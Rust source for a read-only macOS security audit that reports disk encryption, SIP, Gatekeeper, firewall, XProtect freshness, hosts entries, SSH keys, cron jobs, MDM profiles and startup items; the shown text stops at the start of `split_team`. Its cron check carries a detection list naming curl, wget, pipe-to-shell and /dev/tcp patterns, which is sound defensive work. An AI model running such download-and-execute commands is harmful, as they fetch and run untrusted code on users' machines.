//! How protected this Mac is, and what runs by itself. Not an antivirus: macOS already looks for
//! known malware with XProtect. This gathers what is worth a human look, says why, and never removes
//! anything.
//!
//! Every command here only reads, needs no administrator rights and raises no permission dialog.

use std::fs::File;
use std::io::Read;
use std::path::Path;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use anyhow::Result;
use hm_core::fmt::human_age;
use hm_core::{exec, t, tf, ScanContext};
use plist::Value;
use rayon::prelude::*;
use serde::Serialize;

use crate::gate;
use crate::startup;
use crate::types::StartupItem;

const TIMEOUT: Duration = Duration::from_secs(10);
/// Apple ships XProtect updates every couple of weeks.
const XPROTECT_STALE_DAYS: u64 = 45;
/// A startup item changed this recently is pointed out, since new persistence is what to look for.
const RECENT_DAYS: u64 = 7;

/// System Settings panes, opened with `open`.
pub mod panes {
    pub const PRIVACY_SECURITY: &str =
        "x-apple.systempreferences:com.apple.settings.PrivacySecurity.extension";
    pub const NETWORK: &str = "x-apple.systempreferences:com.apple.Network-Settings.extension";
    pub const SOFTWARE_UPDATE: &str =
        "x-apple.systempreferences:com.apple.Software-Update-Settings.extension";
    pub const USERS: &str = "x-apple.systempreferences:com.apple.Users-Groups-Settings.extension";
    pub const LOCK_SCREEN: &str =
        "x-apple.systempreferences:com.apple.Lock-Screen-Settings.extension";
    pub const SHARING: &str = "x-apple.systempreferences:com.apple.Sharing-Settings.extension";
    pub const PROFILES: &str = "x-apple.systempreferences:com.apple.Profiles-Settings.extension";
    pub const LOGIN_ITEMS: &str =
        "x-apple.systempreferences:com.apple.LoginItems-Settings.extension";
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Level {
    /// As it should be.
    Ok,
    /// Worth knowing. Nothing wrong.
    Info,
    /// Worth a look: usually fine, sometimes not.
    Review,
    /// Leaves the Mac clearly less protected.
    Risk,
}

#[derive(Clone, Debug, Serialize)]
pub struct Check {
    pub id: &'static str,
    pub title: String,
    pub detail: String,
    pub level: Level,
    /// What it found, one per line, such as the entries added to `/etc/hosts`.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub lines: Vec<String>,
    /// The System Settings pane where it is changed.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub settings: Option<&'static str>,
}

impl Check {
    fn new(
        id: &'static str,
        level: Level,
        title: impl Into<String>,
        detail: impl Into<String>,
    ) -> Self {
        Self {
            id,
            title: title.into(),
            detail: detail.into(),
            level,
            lines: Vec::new(),
            settings: None,
        }
    }

    fn settings(mut self, pane: &'static str) -> Self {
        self.settings = Some(pane);
        self
    }

    fn lines(mut self, lines: Vec<String>) -> Self {
        self.lines = lines;
        self
    }

    fn unknown(id: &'static str, title: impl Into<String>) -> Self {
        Self::new(
            id,
            Level::Info,
            title,
            t!("No hemos podido comprobarlo.", "We couldn't check it."),
        )
    }
}

/// Who signed a program, which is the best clue to where it came from.
#[derive(Clone, Debug, PartialEq, Serialize)]
#[serde(rename_all = "snake_case", tag = "kind")]
pub enum Signer {
    Apple,
    AppStore,
    DeveloperId {
        name: String,
        team: String,
    },
    /// A development or other non-distribution certificate: someone's own build.
    Development {
        name: String,
    },
    /// Signed, but by no one in particular. Normal for Homebrew and for what you compile yourself.
    AdHoc,
    Unsigned,
    /// Scripts aren't signed, so who wrote one can't be told this way.
    Script,
    /// Only the system can read it.
    Unreadable,
    /// Not looked at: missing, relative, on another volume or in a protected folder.
    NotChecked,
}

impl Signer {
    /// Apple vouches for who made it.
    pub fn is_identified(&self) -> bool {
        matches!(
            self,
            Signer::Apple | Signer::AppStore | Signer::DeveloperId { .. }
        )
    }

    pub fn describe(&self) -> String {
        match self {
            Signer::Apple => t!("Firmado por Apple", "Signed by Apple").to_string(),
            Signer::AppStore => t!("De la Mac App Store", "From the Mac App Store").to_string(),
            Signer::DeveloperId { name, .. } => tf!("Firmado por {name}", "Signed by {name}"),
            Signer::Development { name } => {
                tf!(
                    "Firma de desarrollo de {name}",
                    "Development signature by {name}"
                )
            }
            Signer::AdHoc => t!("Firma ad hoc", "Ad hoc signature").to_string(),
            Signer::Unsigned => t!("Sin firma", "Unsigned").to_string(),
            Signer::Script => t!("Script", "Script").to_string(),
            Signer::Unreadable => {
                t!("Solo lo lee el sistema", "Only the system can read it").to_string()
            }
            Signer::NotChecked => t!("Sin comprobar", "Not checked").to_string(),
        }
    }
}

#[derive(Clone, Debug, Serialize)]
pub struct StartupReview {
    pub item: StartupItem,
    pub signer: Signer,
    pub level: Level,
    pub reasons: Vec<String>,
}

#[derive(Clone, Debug, Serialize)]
pub struct SecurityReport {
    /// `27.0.1`, from `sw_vers`.
    pub macos: Option<String>,
    pub protections: Vec<Check>,
    /// The most worrying first.
    pub startup: Vec<StartupReview>,
    pub other: Vec<Check>,
}

impl SecurityReport {
    /// How many things are worth a look.
    pub fn attention(&self) -> usize {
        let checks = self
            .protections
            .iter()
            .chain(&self.other)
            .filter(|check| check.level >= Level::Review)
            .count();
        checks
            + self
                .startup
                .iter()
                .filter(|review| review.level >= Level::Review)
                .count()
    }

    pub fn worst(&self) -> Level {
        self.protections
            .iter()
            .chain(&self.other)
            .map(|check| check.level)
            .chain(self.startup.iter().map(|review| review.level))
            .max()
            .unwrap_or(Level::Ok)
    }
}

/// Runs every check. Takes a few seconds, mostly reading code signatures.
pub fn report(ctx: &ScanContext) -> Result<SecurityReport> {
    let access = gate::has_access(ctx);
    let mut startup: Vec<StartupReview> = startup::list_items(ctx)?
        .into_par_iter()
        .map(|item| review_item(ctx, item, access))
        .collect();
    startup.sort_by(|a, b| {
        b.level.cmp(&a.level).then_with(|| {
            a.item
                .label
                .to_lowercase()
                .cmp(&b.item.label.to_lowercase())
        })
    });

    let firewall_on = firewall_state();
    let updates = read_update_prefs(Path::new(
        "/Library/Preferences/com.apple.SoftwareUpdate.plist",
    ));
    let macos = command("/usr/bin/sw_vers", &["-productVersion"])
        .map(|(_, out)| out.trim().to_string())
        .filter(|version| !version.is_empty());

    let protections = vec![
        filevault(),
        sip(),
        gatekeeper(),
        firewall(firewall_on),
        security_updates(updates.as_ref()),
        xprotect(ctx.now),
        macos_updates(updates.as_ref(), macos.as_deref(), ctx.now),
        auto_login(Path::new(
            "/Library/Preferences/com.apple.loginwindow.plist",
        )),
        screen_lock(),
    ];
    let other = vec![
        sharing(),
        hosts(Path::new("/etc/hosts")),
        ssh_keys(&ctx.home_path(".ssh/authorized_keys")),
        cron(),
        management(),
        system_extensions(),
    ];
    Ok(SecurityReport {
        macos,
        protections,
        startup,
        other,
    })
}

/// Runs a system tool and returns whether it succeeded and everything it printed.
fn command(program: &str, args: &[&str]) -> Option<(bool, String)> {
    let output = exec::run(Path::new(program), args, TIMEOUT).ok()?;
    let success = output.success();
    Some((success, format!("{}{}", output.stdout, output.stderr)))
}

// ---- Protections --------------------------------------------------------------------------------

fn parse_filevault(output: &str) -> Option<bool> {
    if output.contains("FileVault is On") {
        Some(true)
    } else if output.contains("FileVault is Off") {
        Some(false)
    } else {
        None
    }
}

fn filevault() -> Check {
    let title = "FileVault";
    match command("/usr/bin/fdesetup", &["status"]).and_then(|(_, out)| parse_filevault(&out)) {
        Some(true) => Check::new("filevault", Level::Ok, title, t!(
            "El disco está cifrado: si pierdes el Mac, nadie puede leerlo sin tu contraseña.",
            "The disk is encrypted: if you lose the Mac, no one can read it without your password."
        )),
        Some(false) => Check::new("filevault", Level::Risk, title, t!(
            "El disco no está cifrado: si pierdes el Mac o te lo roban, cualquiera puede leer lo que hay en él.",
            "The disk isn't encrypted: if the Mac is lost or stolen, anyone can read what's on it."
        ))
        .settings(panes::PRIVACY_SECURITY),
        None => Check::unknown("filevault", title),
    }
}

fn parse_sip(output: &str) -> Option<bool> {
    if output.contains("status: enabled") {
        Some(true)
    } else if output.contains("status: disabled") {
        Some(false)
    } else {
        None
    }
}

fn sip() -> Check {
    let title = t!(
        "Protección de la integridad del sistema",
        "System Integrity Protection"
    );
    match command("/usr/bin/csrutil", &["status"]).and_then(|(_, out)| parse_sip(&out)) {
        Some(true) => Check::new("sip", Level::Ok, title, t!(
            "Ni siquiera un programa con permisos de administrador puede modificar macOS.",
            "Not even a program with administrator rights can modify macOS."
        )),
        // Only Recovery can turn it back on, so there is no pane to open.
        Some(false) => Check::new("sip", Level::Risk, title, t!(
            "Está desactivada: un programa con permisos de administrador puede modificar el propio macOS. Se vuelve a activar desde el modo de recuperación con «csrutil enable».",
            "It's off: a program with administrator rights can modify macOS itself. Turn it back on from Recovery with \"csrutil enable\"."
        )),
        None => Check::unknown("sip", title),
    }
}

fn parse_gatekeeper(output: &str) -> Option<bool> {
    if output.contains("assessments enabled") {
        Some(true)
    } else if output.contains("assessments disabled") {
        Some(false)
    } else {
        None
    }
}

fn gatekeeper() -> Check {
    let title = "Gatekeeper";
    match command("/usr/sbin/spctl", &["--status"]).and_then(|(_, out)| parse_gatekeeper(&out)) {
        Some(true) => Check::new(
            "gatekeeper",
            Level::Ok,
            title,
            t!(
                "macOS comprueba quién firmó las apps que descargas antes de abrirlas.",
                "macOS checks who signed the apps you download before opening them."
            ),
        ),
        Some(false) => Check::new(
            "gatekeeper",
            Level::Risk,
            title,
            t!(
                "Está desactivado: se abre cualquier app descargada sin comprobar quién la hizo.",
                "It's off: any downloaded app opens without checking who made it."
            ),
        )
        .settings(panes::PRIVACY_SECURITY),
        None => Check::unknown("gatekeeper", title),
    }
}

fn parse_firewall(output: &str) -> Option<bool> {
    if output.contains("State = 0") {
        Some(false)
    } else if output.contains("State = 1") || output.contains("State = 2") {
        Some(true)
    } else {
        None
    }
}

fn firewall_state() -> Option<bool> {
    command(
        "/usr/libexec/ApplicationFirewall/socketfilterfw",
        &["--getglobalstate"],
    )
    .and_then(|(_, out)| parse_firewall(&out))
}

fn firewall(on: Option<bool>) -> Check {
    let title = t!("Firewall", "Firewall");
    match on {
        Some(true) => Check::new("firewall", Level::Ok, title, t!(
            "Las conexiones que llegan de fuera solo alcanzan a las apps que lo permites.",
            "Incoming connections only reach the apps you allow."
        )),
        Some(false) => Check::new("firewall", Level::Review, title, t!(
            "Está desactivado, que es como viene macOS. Conviene activarlo si te conectas a redes que no son tuyas, como las de un café o una universidad.",
            "It's off, which is how macOS ships. It's worth turning on if you join networks that aren't yours, like at a café or a university."
        ))
        .settings(panes::NETWORK),
        None => Check::unknown("firewall", title),
    }
}

#[derive(Debug, Default, PartialEq)]
struct UpdatePrefs {
    /// Security responses and XProtect.
    critical: Option<bool>,
    config_data: Option<bool>,
    pending: Vec<String>,
    last_check: Option<SystemTime>,
}

fn read_update_prefs(path: &Path) -> Option<UpdatePrefs> {
    let dict = Value::from_file(path).ok()?.into_dictionary()?;
    let flag = |key: &str| dict.get(key).and_then(Value::as_boolean);
    let pending = dict
        .get("RecommendedUpdates")
        .and_then(Value::as_array)
        .map(|updates| {
            updates
                .iter()
                .filter_map(Value::as_dictionary)
                .filter_map(|update| {
                    let name = update.get("Display Name").and_then(Value::as_string)?;
                    Some(
                        match update.get("Display Version").and_then(Value::as_string) {
                            Some(version) if !name.contains(version) => format!("{name} {version}"),
                            _ => name.to_string(),
                        },
                    )
                })
                .collect()
        })
        .unwrap_or_default();
    Some(UpdatePrefs {
        critical: flag("CriticalUpdateInstall"),
        config_data: flag("ConfigDataInstall"),
        pending,
        last_check: dict
            .get("LastSuccessfulDate")
            .and_then(Value::as_date)
            .map(SystemTime::from),
    })
}

fn security_updates(prefs: Option<&UpdatePrefs>) -> Check {
    let title = t!(
        "Actualizaciones de seguridad automáticas",
        "Automatic security updates"
    );
    let Some(prefs) = prefs else {
        return Check::unknown("security_updates", title);
    };
    // A missing key means the default, which is on.
    if prefs.critical != Some(false) && prefs.config_data != Some(false) {
        Check::new(
            "security_updates",
            Level::Ok,
            title,
            t!(
                "XProtect y las respuestas de seguridad rápidas se instalan solas.",
                "XProtect and Rapid Security Responses install by themselves."
            ),
        )
    } else {
        Check::new("security_updates", Level::Review, title, t!(
            "Están desactivadas: XProtect no recibe las definiciones nuevas hasta que actualices a mano.",
            "They're off: XProtect doesn't get new definitions until you update by hand."
        ))
        .settings(panes::SOFTWARE_UPDATE)
    }
}

/// `Version: 5377 Installed: 2026-11-20 19:29:21 +0000`.
fn parse_xprotect(output: &str) -> Option<(String, SystemTime)> {
    let version = output
        .split("Version:")
        .nth(1)?
        .split_whitespace()
        .next()?
        .to_string();
    let installed = output.split("Installed:").nth(1)?.trim();
    Some((version, parse_utc(installed)?))
}

/// `2026-11-20 19:29:21`, read as UTC, which is what these tools print.
fn parse_utc(text: &str) -> Option<SystemTime> {
    let mut parts = text.split_whitespace();
    let mut date = parts.next()?.split('-').map(str::parse::<i64>);
    let (year, month, day) = (date.next()?.ok()?, date.next()?.ok()?, date.next()?.ok()?);
    let mut time = parts
        .next()
        .unwrap_or("0:0:0")
        .split(':')
        .map(str::parse::<i64>);
    let (hour, minute, second) = (
        time.next()?.ok()?,
        time.next().unwrap_or(Ok(0)).ok()?,
        time.next().unwrap_or(Ok(0)).ok()?,
    );
    // Days from the civil date, after Howard Hinnant's algorithm.
    let year = if month <= 2 { year - 1 } else { year };
    let era = year.div_euclid(400);
    let year_of_era = year - era * 400;
    let day_of_year = (153 * (month + if month > 2 { -3 } else { 9 }) + 2) / 5 + day - 1;
    let day_of_era = year_of_era * 365 + year_of_era / 4 - year_of_era / 100 + day_of_year;
    let days = era * 146_097 + day_of_era - 719_468;
    let seconds = days * 86_400 + hour * 3_600 + minute * 60 + second;
    u64::try_from(seconds)
        .ok()
        .map(|seconds| UNIX_EPOCH + Duration::from_secs(seconds))
}

fn xprotect(now: SystemTime) -> Check {
    let title = "XProtect";
    let found = command("/usr/bin/xprotect", &["version"])
        .and_then(|(_, out)| parse_xprotect(&out))
        .or_else(|| {
            // Before macOS 15 there is no `xprotect` tool: the bundle says the version, and its
            // file dates say when it arrived.
            let bundle = Path::new("/Library/Apple/System/Library/CoreServices/XProtect.bundle");
            let info = Value::from_file(bundle.join("Contents/Info.plist")).ok()?;
            let version = info
                .as_dictionary()?
                .get("CFBundleShortVersionString")?
                .as_string()?
                .to_string();
            let modified = std::fs::metadata(bundle.join("Contents/Info.plist"))
                .ok()?
                .modified()
                .ok()?;
            Some((version, modified))
        });
    let Some((version, installed)) = found else {
        return Check::unknown("xprotect", title);
    };
    let age_days = now
        .duration_since(installed)
        .map_or(0, |age| age.as_secs() / 86_400);
    if age_days <= XPROTECT_STALE_DAYS {
        Check::new(
            "xprotect",
            Level::Ok,
            title,
            tf!(
                "El detector de malware de macOS está en la versión {version}, actualizada {}.",
                "macOS's malware detector is at version {version}, updated {}.",
                human_age(installed, now)
            ),
        )
    } else {
        Check::new("xprotect", Level::Review, title, tf!(
            "El detector de malware de macOS no se actualiza desde hace {age_days} días (versión {version}). Suele recibir novedades cada dos semanas.",
            "macOS's malware detector hasn't been updated in {age_days} days (version {version}). It usually gets updates every two weeks."
        ))
        .settings(panes::SOFTWARE_UPDATE)
    }
}

fn macos_updates(prefs: Option<&UpdatePrefs>, version: Option<&str>, now: SystemTime) -> Check {
    let title = match version {
        Some(version) => format!("macOS {version}"),
        None => "macOS".to_string(),
    };
    let Some(prefs) = prefs else {
        return Check::unknown("macos_updates", title);
    };
    if !prefs.pending.is_empty() {
        return Check::new(
            "macos_updates",
            Level::Review,
            title,
            t!(
                "Hay actualizaciones pendientes. Suelen traer arreglos de seguridad.",
                "There are updates waiting. They usually bring security fixes."
            ),
        )
        .lines(prefs.pending.clone())
        .settings(panes::SOFTWARE_UPDATE);
    }
    let detail = match prefs.last_check {
        Some(checked) => tf!(
            "Al día, según la última comprobación, {}.",
            "Up to date, as of the last check {}.",
            human_age(checked, now)
        ),
        None => t!("Al día.", "Up to date.").to_string(),
    };
    Check::new("macos_updates", Level::Ok, title, detail)
}

fn auto_login(path: &Path) -> Check {
    let title = t!("Inicio de sesión automático", "Automatic login");
    let user = Value::from_file(path)
        .ok()
        .and_then(Value::into_dictionary)
        .and_then(|dict| {
            dict.get("autoLoginUser")
                .and_then(Value::as_string)
                .map(str::to_string)
        });
    match user {
        Some(user) => Check::new(
            "auto_login",
            Level::Risk,
            title,
            tf!(
                "Está activado para {user}: quien encienda el Mac entra sin contraseña.",
                "It's on for {user}: whoever turns the Mac on gets in without a password."
            ),
        )
        .settings(panes::USERS),
        None => Check::new(
            "auto_login",
            Level::Ok,
            title,
            t!(
                "Desactivado: hace falta la contraseña para entrar.",
                "Off: the password is needed to get in."
            ),
        ),
    }
}

#[derive(Debug, PartialEq)]
enum ScreenLock {
    Immediate,
    After(u64),
    Off,
}

fn parse_screen_lock(output: &str) -> Option<ScreenLock> {
    if output.contains("screenLock delay is immediate") {
        return Some(ScreenLock::Immediate);
    }
    if output.contains("screenLock is off") {
        return Some(ScreenLock::Off);
    }
    let seconds = output
        .split("screenLock delay is ")
        .nth(1)?
        .split_whitespace()
        .next()?
        .parse()
        .ok()?;
    Some(ScreenLock::After(seconds))
}

fn screen_lock() -> Check {
    let title = t!("Contraseña al despertar", "Password on wake");
    let state = command("/usr/sbin/sysadminctl", &["-screenLock", "status"])
        .and_then(|(_, out)| parse_screen_lock(&out));
    match state {
        Some(ScreenLock::Immediate) => Check::new(
            "screen_lock",
            Level::Ok,
            title,
            t!(
                "La pide en cuanto la pantalla se bloquea o el Mac entra en reposo.",
                "It's asked for as soon as the screen locks or the Mac sleeps."
            ),
        ),
        Some(ScreenLock::After(seconds)) if seconds <= 300 => Check::new(
            "screen_lock",
            Level::Ok,
            title,
            tf!(
                "La pide a los {} de bloquearse.",
                "It's asked for {} after locking.",
                human_seconds(seconds)
            ),
        ),
        Some(ScreenLock::After(seconds)) => Check::new(
            "screen_lock",
            Level::Review,
            title,
            tf!(
            "No la pide hasta {} después de bloquearse: en ese rato cualquiera puede usar el Mac.",
            "It isn't asked for until {} after locking: in that time anyone can use the Mac.",
            human_seconds(seconds)
        ),
        )
        .settings(panes::LOCK_SCREEN),
        Some(ScreenLock::Off) => Check::new(
            "screen_lock",
            Level::Review,
            title,
            t!(
                "No se pide: cualquiera que despierte el Mac puede usarlo.",
                "It isn't asked for: anyone who wakes the Mac can use it."
            ),
        )
        .settings(panes::LOCK_SCREEN),
        None => Check::unknown("screen_lock", title),
    }
}

fn human_seconds(seconds: u64) -> String {
    if seconds < 60 {
        tf!("{seconds} s", "{seconds} s")
    } else {
        tf!("{} min", "{} min", seconds / 60)
    }
}

// ---- Other things worth a look ------------------------------------------------------------------

/// Services that let someone in from another computer, by the port they listen on.
fn sharing_service(port: u16) -> Option<&'static str> {
    Some(match port {
        22 => t!("Inicio de sesión remoto (SSH)", "Remote Login (SSH)"),
        5900 => t!("Compartir pantalla", "Screen Sharing"),
        3283 => t!("Gestión remota", "Remote Management"),
        445 => t!("Compartir archivos (SMB)", "File Sharing (SMB)"),
        548 => t!("Compartir archivos (AFP)", "File Sharing (AFP)"),
        _ => return None,
    })
}

/// Sharing services listening beyond this Mac, from `netstat -an` lines such as
/// `tcp4  0  0  *.22  *.*  LISTEN`.
fn parse_listening(output: &str) -> Vec<&'static str> {
    let mut services: Vec<&'static str> = output
        .lines()
        .filter(|line| line.trim_end().ends_with("LISTEN"))
        .filter_map(|line| {
            let local = line.split_whitespace().nth(3)?;
            let (address, port) = local.rsplit_once('.')?;
            let loopback = address.starts_with("127.") || address == "::1";
            if loopback {
                return None;
            }
            sharing_service(port.parse().ok()?)
        })
        .collect();
    services.sort_unstable();
    services.dedup();
    services
}

fn sharing() -> Check {
    let title = t!("Acceso remoto", "Remote access");
    let Some((_, output)) = command("/usr/sbin/netstat", &["-an", "-p", "tcp"]) else {
        return Check::unknown("sharing", title);
    };
    let services = parse_listening(&output);
    if services.is_empty() {
        Check::new(
            "sharing",
            Level::Ok,
            title,
            t!(
                "No hay nada activo que deje entrar desde otro ordenador.",
                "Nothing is on that lets someone in from another computer."
            ),
        )
    } else {
        Check::new("sharing", Level::Info, title, t!(
            "Estos servicios aceptan conexiones desde otros ordenadores. Si no los usas, apágalos en Compartir.",
            "These services accept connections from other computers. If you don't use them, turn them off in Sharing."
        ))
        .lines(services.into_iter().map(str::to_string).collect())
        .settings(panes::SHARING)
    }
}

/// Domains whose redirection would get in the way of security updates or impersonate a big site.
const SENSITIVE_DOMAINS: &[&str] = &[
    "apple.com",
    "icloud.com",
    "mzstatic.com",
    "apple-cloudkit.com",
];

/// The entries someone added to `/etc/hosts`, as `address → names`, and whether any redirects an
/// Apple server.
fn parse_hosts(content: &str) -> (Vec<String>, bool) {
    const DEFAULTS: &[(&str, &str)] = &[
        ("127.0.0.1", "localhost"),
        ("255.255.255.255", "broadcasthost"),
        ("::1", "localhost"),
        ("fe80::1%lo0", "localhost"),
    ];
    let mut entries = Vec::new();
    let mut touches_apple = false;
    for line in content.lines() {
        let line = line.split('#').next().unwrap_or_default().trim();
        let mut fields = line.split_whitespace();
        let Some(address) = fields.next() else {
            continue;
        };
        let names: Vec<&str> = fields
            .filter(|name| !DEFAULTS.contains(&(address, name)))
            .collect();
        if names.is_empty() {
            continue;
        }
        touches_apple |= names.iter().any(|name| {
            SENSITIVE_DOMAINS
                .iter()
                .any(|domain| *name == *domain || name.ends_with(&format!(".{domain}")))
        });
        entries.push(format!("{address} → {}", names.join(", ")));
    }
    (entries, touches_apple)
}

fn hosts(path: &Path) -> Check {
    let title = t!("Archivo hosts", "Hosts file");
    let Ok(content) = std::fs::read_to_string(path) else {
        return Check::unknown("hosts", title);
    };
    let (entries, touches_apple) = parse_hosts(&content);
    if entries.is_empty() {
        return Check::new(
            "hosts",
            Level::Ok,
            title,
            t!(
                "Como viene de fábrica: ningún nombre se desvía a otra dirección.",
                "As it ships: no name is sent to a different address."
            ),
        );
    }
    let (level, detail) = if touches_apple {
        (Level::Review, t!(
            "Desvía servidores de Apple, lo que puede impedir que lleguen las actualizaciones de seguridad. Si no lo hiciste tú, revísalo.",
            "It redirects Apple servers, which can keep security updates from arriving. If you didn't do this, look into it."
        ))
    } else {
        (Level::Info, t!(
            "Estos nombres se desvían a otra dirección. Es habitual al desarrollar; si no los añadiste tú, revísalos.",
            "These names go to a different address. It's common when developing; if you didn't add them, look into them."
        ))
    };
    Check::new("hosts", level, title, detail).lines(entries)
}

fn count_keys(content: &str) -> usize {
    content
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .count()
}

fn ssh_keys(path: &Path) -> Check {
    let title = t!("Claves SSH autorizadas", "Authorized SSH keys");
    match std::fs::read_to_string(path) {
        Ok(content) if count_keys(&content) > 0 => {
            let keys = count_keys(&content);
            Check::new("ssh_keys", Level::Info, title, tf!(
                "{keys} {} puede entrar en tu cuenta por SSH, si el inicio de sesión remoto está activo. Comprueba que las reconoces en ~/.ssh/authorized_keys.",
                "{keys} {} can log into your account over SSH, if Remote Login is on. Check you recognize them in ~/.ssh/authorized_keys.",
                if keys == 1 { t!("clave", "key") } else { t!("claves", "keys") }
            ))
        }
        _ => Check::new(
            "ssh_keys",
            Level::Ok,
            title,
            t!(
                "Ninguna clave permite entrar en tu cuenta por SSH.",
                "No key lets anyone into your account over SSH."
            ),
        ),
    }
}

/// Code that fetches or decodes something to run: the usual first step of malware, and of plenty of
/// honest installers too.
fn downloads_something(text: &str) -> bool {
    let text = text.to_lowercase();
    [
        "curl ",
        "wget ",
        "http://",
        "https://",
        "base64",
        "| sh",
        "|sh",
        "| bash",
        "|bash",
        "/dev/tcp/",
    ]
    .iter()
    .any(|pattern| text.contains(pattern))
}

fn cron_jobs(output: &str) -> Vec<String> {
    output
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        // Variable assignments such as `MAILTO=me` aren't jobs.
        .filter(|line| {
            !line
                .split_whitespace()
                .next()
                .is_some_and(|first| first.contains('=') && !first.starts_with('*'))
        })
        .map(str::to_string)
        .collect()
}

fn cron() -> Check {
    let title = t!("Tareas programadas (cron)", "Scheduled tasks (cron)");
    let jobs = command("/usr/bin/crontab", &["-l"])
        .filter(|(success, _)| *success)
        .map(|(_, out)| cron_jobs(&out))
        .unwrap_or_default();
    if jobs.is_empty() {
        return Check::new(
            "cron",
            Level::Ok,
            title,
            t!(
                "Tu usuario no tiene tareas programadas con cron.",
                "Your user has no tasks scheduled with cron."
            ),
        );
    }
    let (level, detail) = if jobs.iter().any(|job| downloads_something(job)) {
        (Level::Review, t!(
            "Alguna descarga algo de internet para ejecutarlo. Si no la creaste tú, revísala con «crontab -e».",
            "One downloads something from the internet to run it. If you didn't create it, look into it with \"crontab -e\"."
        ))
    } else {
        (Level::Info, t!(
            "Se ejecutan solas cada cierto tiempo. Si no las reconoces, revísalas con «crontab -e».",
            "They run by themselves every so often. If you don't recognize them, look into them with \"crontab -e\"."
        ))
    };
    Check::new("cron", level, title, detail).lines(jobs)
}

/// From `profiles status -type enrollment`: `MDM enrollment: Yes (User Approved)`.
fn parse_enrollment(output: &str) -> Option<bool> {
    let line = output
        .lines()
        .find(|line| line.contains("MDM enrollment:"))?;
    let value = line.split("MDM enrollment:").nth(1)?.trim();
    Some(value.starts_with("Yes"))
}

/// Profile identifiers from `profiles list`, as in `ana[1] attribute: profileIdentifier: com.x`.
fn parse_profiles(output: &str) -> Vec<String> {
    output
        .lines()
        .filter_map(|line| line.split("profileIdentifier:").nth(1))
        .map(|id| id.trim().to_string())
        .filter(|id| !id.is_empty())
        .collect()
}

fn management() -> Check {
    let title = t!(
        "Gestión del Mac (MDM y perfiles)",
        "Device management (MDM and profiles)"
    );
    let enrolled = command("/usr/bin/profiles", &["status", "-type", "enrollment"])
        .and_then(|(_, out)| parse_enrollment(&out));
    let profiles = command("/usr/bin/profiles", &["list"])
        .map(|(_, out)| parse_profiles(&out))
        .unwrap_or_default();
    if enrolled == Some(true) {
        return Check::new("management", Level::Info, title, t!(
            "Una organización gestiona este Mac: puede instalar apps y perfiles, y cambiar ajustes. Es normal en un Mac de empresa o de un centro de estudios.",
            "An organization manages this Mac: it can install apps and profiles and change settings. That's normal for a work or school Mac."
        ))
        .lines(profiles)
        .settings(panes::PROFILES);
    }
    if !profiles.is_empty() {
        return Check::new("management", Level::Review, title, t!(
            "Hay perfiles de configuración instalados en tu usuario. Pueden cambiar ajustes, como el proxy o los certificados en los que se confía. Si no sabes de dónde salen, revísalos.",
            "Configuration profiles are installed for your user. They can change settings, such as the proxy or which certificates are trusted. If you don't know where they came from, look into them."
        ))
        .lines(profiles)
        .settings(panes::PROFILES);
    }
    match enrolled {
        Some(false) => Check::new("management", Level::Ok, title, t!(
            "Ninguna organización gestiona este Mac y tu usuario no tiene perfiles de configuración.",
            "No organization manages this Mac and your user has no configuration profiles."
        )),
        _ => Check::unknown("management", title),
    }
}

/// Third-party system extensions, from the tab-separated rows of `systemextensionsctl list`.
fn parse_system_extensions(output: &str) -> Vec<String> {
    output
        .lines()
        .filter_map(|line| {
            let fields: Vec<&str> = line.split('\t').collect();
            if fields.len() < 6 || fields[0] == "enabled" {
                return None;
            }
            let (team, name, state) = (fields[2].trim(), fields[4].trim(), fields[5].trim());
            if name.is_empty() || state.contains("uninstall") || state.contains("terminated") {
                return None;
            }
            Some(format!("{name} ({team})"))
        })
        .collect()
}

fn system_extensions() -> Check {
    let title = t!("Extensiones del sistema", "System extensions");
    let Some((_, output)) = command("/usr/bin/systemextensionsctl", &["list"]) else {
        return Check::unknown("system_extensions", title);
    };
    let extensions = parse_system_extensions(&output);
    if extensions.is_empty() {
        return Check::new(
            "system_extensions",
            Level::Ok,
            title,
            t!(
                "No hay extensiones de terceros funcionando dentro de macOS.",
                "No third-party extensions run inside macOS."
            ),
        );
    }
    Check::new("system_extensions", Level::Info, title, t!(
        "Funcionan dentro de macOS con muchos privilegios: VPN, antivirus, filtros de red. Comprueba que reconoces cada una.",
        "They run inside macOS with broad privileges: VPNs, antivirus, network filters. Check you recognize each one."
    ))
    .lines(extensions)
    .settings(panes::LOGIN_ITEMS)
}

// ---- What runs by itself ------------------------------------------------------------------------

/// Hidden folders in the home where developer tools keep their programs.
const KNOWN_HIDDEN: &[&str] = &[
    ".asdf",
    ".bun",
    ".cache",
    ".cargo",
    ".colima",
    ".config",
    ".deno",
    ".docker",
    ".fnm",
    ".foundry",
    ".goenv",
    ".jenv",
    ".lmstudio",
    ".local",
    ".nodenv",
    ".npm",
    ".nvm",
    ".ollama",
    ".orbstack",
    ".pyenv",
    ".rbenv",
    ".rd",
    ".rustup",
    ".sdkman",
    ".volta",
];

/// Where a program has no business living unless whoever made it is known.
fn odd_location(home: &Path, program: &Path) -> Option<&'static str> {
    const TEMPORARY: &[&str] = &[
        "/tmp",
        "/private/tmp",
        "/var/tmp",
        "/private/var/tmp",
        "/var/folders",
        "/private/var/folders",
    ];
    if TEMPORARY.iter().any(|dir| program.starts_with(dir)) {
        return Some(t!(
            "Está en una carpeta temporal.",
            "It lives in a temporary folder."
        ));
    }
    if program.starts_with("/Users/Shared") {
        return Some(t!(
            "Está en /Users/Shared, donde puede escribir cualquier usuario.",
            "It lives in /Users/Shared, which any user can write to."
        ));
    }
    let hidden = program.strip_prefix(home).ok()?.components().any(|part| {
        let name = part.as_os_str().to_string_lossy();
        name.starts_with('.') && !KNOWN_HIDDEN.contains(&name.as_ref())
    });
    hidden.then_some(t!(
        "Está en una carpeta oculta.",
        "It lives in a hidden folder."
    ))
}

fn is_mach_o(path: &Path) -> Option<bool> {
    let mut magic = [0u8; 4];
    File::open(path).ok()?.read_exact(&mut magic).ok()?;
    Some(matches!(
        u32::from_be_bytes(magic),
        0xfeed_face | 0xfeed_facf | 0xcefa_edfe | 0xcffa_edfe | 0xcafe_babe | 0xbeba_feca
    ))
}

fn split_team(text: &str) -> (String, String) {
